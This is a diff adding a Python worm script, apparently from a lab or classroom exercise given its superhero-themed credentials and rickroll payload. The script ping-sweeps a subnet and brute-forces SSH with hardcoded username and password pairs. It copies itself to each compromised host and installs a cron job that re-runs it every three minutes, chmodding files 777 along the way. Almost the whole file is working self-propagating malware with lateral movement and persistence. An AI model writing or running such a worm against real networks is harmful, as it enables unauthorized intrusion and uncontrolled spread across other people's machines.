@@ -1,0 +1,184 @@
+#!/usr/bin/python3
+
+import os
+import sys
+import glob
+import shutil
+import socket
+import paramiko
+import logging
+import netifaces
+import subprocess
+import time
+ 
+from concurrent.futures import ThreadPoolExecutor
+
+def ping_host(address):
+	res = subprocess.call(['ping', '-c', '1', address], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+	if res == 0:
+		return address
+
+
+def get_list_of_hosts():
+	hostlist = []
+	hostname = socket.gethostname()
+	my_IP_address = socket.gethostbyname(hostname)
+	ip_sections = my_IP_address.split(".")[:2]
+	first_2_sections_str = ".".join(ip_sections)
+
+	with ThreadPoolExecutor(max_workers=500) as executor:
+		futures = [executor.submit(ping_host, f"{first_2_sections_str}.{ping}.{ping2}") for ping in range(49, 62) for ping2 in range(136, 252)]
+
+		for future in futures:
+			result = future.result()
+			if result and result != my_IP_address:
+				print(result)
+				hostlist.append(result)
+            		 
+	
+	return hostlist
+
+	
+def ssh_connection(host, username, password):
+
+######### Create an SSH client
+	client = paramiko.SSHClient()
+	logging.basicConfig(filename='error.log', level=logging.INFO)
+	script_path = os.path.abspath(__file__)
+	delay_minutes = len(password)
+	staggered_minutes = delay_minutes % 60 
+	staggered_schedule = f"*/3 * * * * sleep {staggered_minutes}m && "
+	command = f"/usr/bin/python3 /tmp/worm/wormff.py >> /tmp/logfile.log 2>&1"
+	cron_schedule = "*/3 * * * *"
+	cron_job = f"{staggered_schedule} {command}\n"
+	sftpClient = None
+	 
+######### write the cron job
+	with open("/tmp/cron_temp_job", "w") as cron_file:
+        	cron_file.write(cron_job)
+	os.system("chmod 777 /tmp/cron_temp_job")
+	   
+	try:
+################# Automatically add the server's host key (this is insecure and should be avoided in production)
+		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+################# Connect to the SSH server
+		client.connect(host, username=username, password=password, banner_timeout=1)
+
+		logging.info(f"SSH connection successful for {username}")
+		print(f"SSH connection successful for {username} on {host} with password {password}")
+		
+################# Open sftp
+		sftpClient = client.open_sftp()
+		
+		logging.info(f"transferring files to {host}")
+		 
+################# Check if the directory exists
+		stdin, stdout, stderr = client.exec_command("test -d /tmp/worm && echo 'exists' || echo 'not exists'")
+		directory_status = stdout.read().decode().strip()
+		if directory_status == 'not exists':
+			
+######################### If the directory doesn't exist, create it
+			stdin, stdout, stderr = client.exec_command("mkdir /tmp/worm")
+			 
+			logging.info("Directory created: /tmp/worm")
+			
+################# change permissions			
+		client.exec_command("chmod 777 /tmp/worm")
+		  
+		client.exec_command(f"chmod 777 /home/{username}/cron_temp_job")
+		print("cron perms changed") 
+################# Check if the file exists
+		stdin, stdout, stderr = client.exec_command(f"test -d /tmp/worm/wormff.py && echo 'exists' || echo 'not exists'")
+		file_status = stdout.read().decode().strip()
+		if file_status == 'not exists':
+			
+######################### If the file doesn't exist, create it   
+			sftpClient.put(script_path, "/tmp/worm/" + "wormff.py")
+  
+			logging.info(f"files transferred to {host}") 
+			print(f"files transferred to {host}") 
+
+################# change permissions			
+		client.exec_command("chmod 777 /tmp/worm/wormff.py")    
+		print("worm perms changed") 
+				 
+################# copy cron job to temp folder
+		stdin, stdout, stderr = client.exec_command("test -d /tmp/cron_temp_job && echo 'exists' || echo 'not exists'")
+		
+		cron_status = stdout.read().decode().strip() 
+		
+		if cron_status == 'not exists':  
+			sftpClient.put("/tmp/cron_temp_job", f"/home/{username}/cron_temp_job")
+			
+		print("cron job coppied")
+		
+################# change permissions		
+		client.exec_command(f"chmod 777 /home/{username}/cron_temp_job")
+		print("cron perms changed")
+		
+################# create cron job on target machine
+		stdin, stdout, stderr = client.exec_command(f"crontab /home/{username}/cron_temp_job")
+		
+		logging.info (f"creating cronjob on {host}")
+		print(f"creating cronjob on {host}")
+		
+################# remove cron job from tmp folder
+		stdin, stdout, stderr = client.exec_command(f"rm /home/{username}/cron_temp_job")
+		
+		logging.info ("removing temp cron job")
+		print("removing temp cron job")
+		
+		
+		
+	except paramiko.AuthenticationException: 
+		logging.error(f"Authentication failed for {username}.")
+		print(f"auth failed on {host} for {username}") 
+	except paramiko.SSHException as e:
+		logging.error(f"Unable to establish SSH connection: {e}")
+	except paramiko.ssh_exception.NoValidConnectionsError:
+		logging.error("Not a valid SSH connection")
+	finally:
+################# Close the SSH connection, if it was established
+		if sftpClient is not None:
+			sftpClient.close()  
+		client.close()
+		
+		logging.info("Connection closed.")
+		print(f"connection closed for {username}\n")
+	
+#########remove cron job from host tmp folder	
+	os.remove("/tmp/cron_temp_job")
+		
+    
+credentials = {
+    "carold": "captainmarvel",
+    "bruceb": "hulk",
+    "natashar": "blackwidow",
+    "tonys": "ironman"
+}
+os.environ['DISPLAY'] = ':0'
+os.system("firefox https://shattereddisk.github.io/rickroll/rickroll.mp4")    
+def main():
+	if os.path.exists("/tmp/cron_temp_job"):
+		os.system("sudo rm /tmp/cron_temp_job")
+		print("removing temp cron")
+	hostlist = get_list_of_hosts()
+	print(hostlist)
+	for host in hostlist:
+		for username, password in credentials.items():
+			ssh_connection(host, username, password)
+	
+main()
+
+
+
+
+
+
+
+
+
+
+
+
